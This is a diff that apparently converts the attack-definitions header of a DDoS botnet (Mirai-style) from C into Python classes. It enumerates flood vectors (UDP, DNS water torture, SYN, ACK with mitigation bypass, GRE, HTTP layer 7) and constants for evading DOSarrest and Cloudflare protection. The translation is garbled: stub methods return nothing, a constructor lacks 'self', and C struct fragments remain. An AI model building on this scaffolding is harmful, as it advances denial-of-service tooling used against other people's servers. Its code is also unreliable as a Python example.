@@ -17,26 +17,82 @@ HTTP_CONNECTION_MAX	= 1000
 HTTP_CONNECTION_MAX	= 256
 #endif
 
-struct attack_target {
-    struct sockaddr_in sock_addr
-    ipv4_t addr
+class attack_target(object):
+    def __init__(self, sock_addr, addr):
+        self.sock_addr = sock_addr
+        self.addr = addr
+    def sockaddr_in(sock_addr):
+        return
+    def ipv4_t(addr):
+        return
+# struct attack_target {
+#     struct sockaddr_in sock_addr
+#     ipv4_t addr
+#
+# struct attack_option {
+class attack_option(object):
+    def __init__(self, int, attack_target, ATK_VEC_UDP,ATK_VEC_VSE,ATK_VEC_DNS,ATK_VEC_SYN,ATK_VEC_ACK,ATK_VEC_STOMP,ATK_VEC_GREIP,ATK_VEC_GREETH,ATK_VEC_UDP_PLAIN,ATK_VEC_HTTP,ATK_OPT_PAYLOAD_SIZE,ATK_OPT_PAYLOAD_RAND,ATK_OPT_IP_TOS,ATK_OPT_IP_IDENT,ATK_OPT_IP_TTL,ATK_OPT_IP_DF,ATK_OPT_SPORT,ATK_OPT_DPORT,ATK_OPT_DOMAIN,ATK_OPT_DNS_HDR_ID,ATK_OPT_URG,ATK_OPT_ACK,ATK_OPT_PSH,ATK_OPT_RST,ATK_OPT_SYN,ATK_OPT_FIN,ATK_OPT_SEQRND,ATK_OPT_ACKRND,ATK_OPT_GRE_CONSTIP,ATK_OPT_METHOD,ATK_OPT_POST_DATA,ATK_OPT_PATH,ATK_OPT_HTTPS,ATK_OPT_CONNS,ATK_OPT_SOURCE):
+        self.int = int
+        self.attack_target = attack_target
+        self.ATK_VEC_UDP = ATK_VEC_UDP
+        self.ATK_VEC_VSE = ATK_VEC_VSE
+        self.ATK_VEC_DNS = ATK_VEC_DNS
+        self.ATK_VEC_SYN = ATK_VEC_SYN
+        self.ATK_VEC_ACK = ATK_VEC_ACK
+        self.ATK_VEC_STOMP = ATK_VEC_STOMP
+        self.ATK_VEC_GREIP = ATK_VEC_GREIP
+        self.ATK_VEC_GREETH = ATK_VEC_GREETH
+        self.ATK_VEC_UDP_PLAIN = ATK_VEC_UDP_PLAIN
+        self.ATK_VEC_HTTP = ATK_VEC_HTTP
+        self.ATK_OPT_PAYLOAD_SIZE = ATK_OPT_PAYLOAD_SIZE
+        self.ATK_OPT_PAYLOAD_RAND = ATK_OPT_PAYLOAD_RAND
+        self.ATK_OPT_IP_TOS = ATK_OPT_IP_TOS
+        self.ATK_OPT_IP_IDENT = ATK_OPT_IP_IDENT
+        self.ATK_OPT_IP_TTL = ATK_OPT_IP_TTL
+        self.ATK_OPT_IP_DF = ATK_OPT_IP_DF
+        self.ATK_OPT_SPORT = ATK_OPT_SPORT
+        self.ATK_OPT_DPORT = ATK_OPT_DPORT
+        self.ATK_OPT_DOMAIN = ATK_OPT_DOMAIN
+        self.ATK_OPT_DNS_HDR_ID = ATK_OPT_DNS_HDR_ID
+        self.ATK_OPT_URG = ATK_OPT_URG
+        self.ATK_OPT_ACK = ATK_OPT_ACK
+        self.ATK_OPT_PSH = ATK_OPT_PSH
+        self.ATK_OPT_RST = ATK_OPT_RST
+        self.ATK_OPT_SYN = ATK_OPT_SYN
+        self.ATK_OPT_FIN = ATK_OPT_FIN
+        self.ATK_OPT_SEQRND = ATK_OPT_SEQRND
+        self.ATK_OPT_ACKRND = ATK_OPT_ACKRND
+        self.ATK_OPT_GRE_CONSTIP = ATK_OPT_GRE_CONSTIP
+        self.ATK_OPT_METHOD = ATK_OPT_METHOD
+        self.ATK_OPT_POST_DATA = ATK_OPT_POST_DATA
+        self.ATK_OPT_PATH = ATK_OPT_PATH
+        self.ATK_OPT_HTTPS = ATK_OPT_HTTPS
+        self.ATK_OPT_CONNS = ATK_OPT_CONNS
+        self.ATK_OPT_SOURCE = ATK_OPT_SOURCE
 
-struct attack_option {
+class attack_method(object):
+    def __init__(int, attack_target):
+        self.int = int
+        self.attack_target = attack_target
 
-typedef (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *)
-typedef ATTACK_VECTOR
+    def ATTACK_FUNC(func):
+        return
+    def ATTACK_VECTOR(vector):
+        return
+# typedef (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *)
+# typedef ATTACK_VECTOR
 
-ATK_VEC_UDP	= 0  # Straight up UDP flood 
-ATK_VEC_VSE	= 1  # Valve Source Engine query flood 
-ATK_VEC_DNS	= 2  # DNS water torture 
-ATK_VEC_SYN	= 3  # SYN flood with options 
-ATK_VEC_ACK	= 4  # ACK flood 
-ATK_VEC_STOMP	= 5  # ACK flood to bypass mitigation devices 
-ATK_VEC_GREIP	= 6  # GRE IP flood 
-ATK_VEC_GREETH	= 7  # GRE Ethernet flood 
+ATK_VEC_UDP	= 0  # Straight up UDP flood
+ATK_VEC_VSE	= 1  # Valve Source Engine query flood
+ATK_VEC_DNS	= 2  # DNS water torture
+ATK_VEC_SYN	= 3  # SYN flood with options
+ATK_VEC_ACK	= 4  # ACK flood
+ATK_VEC_STOMP	= 5  # ACK flood to bypass mitigation devices
+ATK_VEC_GREIP	= 6  # GRE IP flood
+ATK_VEC_GREETH	= 7  # GRE Ethernet flood
 ##define ATK_VEC_PROXY      8  /* Proxy knockback connection */
-ATK_VEC_UDP_PLAIN	= 9  # Plain UDP flood optimized for speed 
-ATK_VEC_HTTP	= 10 # HTTP layer 7 flood 
+ATK_VEC_UDP_PLAIN	= 9  # Plain UDP flood optimized for speed
+ATK_VEC_HTTP	= 10 # HTTP layer 7 flood
 
 ATK_OPT_PAYLOAD_SIZE	= 0   # What should the size of the packet data be?
 ATK_OPT_PAYLOAD_RAND	= 1   # Should we randomize the packet data contents?
@@ -69,6 +125,17 @@ struct attack_method {
     ATTACK_FUNC func
     ATTACK_VECTOR vector
 
+class attack_stomp_data(object):
+    def __init__(self, addr, sport, dport):
+        self.addr = addr
+        self.sport = sport
+        self.dport = dport
+
+    def ipv4_t(addr):
+        return
+
+    def port_t(sport,dport):
+        return
 struct attack_stomp_data {
     ipv4_t addr
     port_t sport, dport
@@ -78,7 +145,7 @@ HTTP_CONN_RESTART	= 1 # Scheduled to restart connection next spin
 HTTP_CONN_CONNECTING	= 2 # Waiting for it to connect
 HTTP_CONN_HTTPS_STUFF	= 3 # Handle any needed HTTPS stuff such as negotiation
 HTTP_CONN_SEND	= 4 # Sending HTTP request
-HTTP_CONN_SEND_HEADERS	= 5 # Send HTTP headers 
+HTTP_CONN_SEND_HEADERS	= 5 # Send HTTP headers
 HTTP_CONN_RECV_HEADER	= 6 # Get HTTP headers and check for things like location or cookies etc
 HTTP_CONN_RECV_BODY	= 7 # Get HTTP body and check for cf iaua mode
 HTTP_CONN_SEND_JUNK	= 8 # Send as much data as possible
@@ -97,19 +164,51 @@ HTTP_POST_MAX	= 512 # max post data len
 HTTP_PROT_DOSARREST	= 1 # Server: DOSarrest
 HTTP_PROT_CLOUDFLARE	= 2 # Server: cloudflare-nginx
 
-struct attack_http_state {
-    ipv4_t dst_addr
+class attack_http_state(object):
+    def __init__(self, dst_addr):
+        self.dst_addr = dst_addr
+        self.HTTP_CONN_INIT = HTTP_CONN_INIT
+        self.HTTP_CONN_RESTART = HTTP_CONN_RESTART
+        self.HTTP_CONN_CONNECTING = HTTP_CONN_CONNECTING
+        self.HTTP_CONN_HTTPS_STUFF = HTTP_CONN_HTTPS_STUFF
+        self.HTTP_CONN_SEND = HTTP_CONN_SEND
+        self.HTTP_CONN_SEND_HEADERS = HTTP_CONN_SEND_HEADERS
+        self.HTTP_CONN_RECV_HEADER = HTTP_CONN_RECV_HEADER
+        self.HTTP_CONN_RECV_BODY = HTTP_CONN_RECV_BODY
+        self.HTTP_CONN_SEND_JUNK = HTTP_CONN_SEND_JUNK
+        self.HTTP_CONN_SNDBUF_WAIT = HTTP_CONN_SNDBUF_WAIT
+        self.HTTP_CONN_QUEUE_RESTART = HTTP_CONN_QUEUE_RESTART
+        self.HTTP_CONN_CLOSED = HTTP_CONN_CLOSED
+        self.HTTP_RDBUF_SIZE = HTTP_RDBUF_SIZE
+        self.HTTP_HACK_DRAIN = HTTP_HACK_DRAIN
+        self.HTTP_PATH_MAX = HTTP_PATH_MAX
+        self.HTTP_DOMAIN_MAX = HTTP_DOMAIN_MAX
+        self.HTTP_COOKIE_MAX = HTTP_COOKIE_MAX
+        self.HTTP_COOKIE_LEN_MAX = HTTP_COOKIE_LEN_MAX
+        self.HTTP_POST_MAX = HTTP_POST_MAX
+        self.HTTP_PROT_DOSARREST = HTTP_PROT_DOSARREST
+        self.HTTP_PROT_CLOUDFLARE = HTTP_PROT_CLOUDFLARE
+
+    def ipv4_t(dst_addr):
+        return
+# struct attack_http_state {
+#     ipv4_t dst_addr
 
 
 
+class attack_cfnull_state(object):
+    def __init__(self, dst_addr):
+        self.dst_addr = dst_addr
+    def ipv4_t(dst_addr):
+        return
+# 
+# struct attack_cfnull_state {
+#     ipv4_t dst_addr
 
+attack_init = True
+# BOOL attack_init(void)
 
-struct attack_cfnull_state {
-    ipv4_t dst_addr
-
-BOOL attack_init(void)
-
-# Actual attacks 
+# Actual attacks
 
 
 
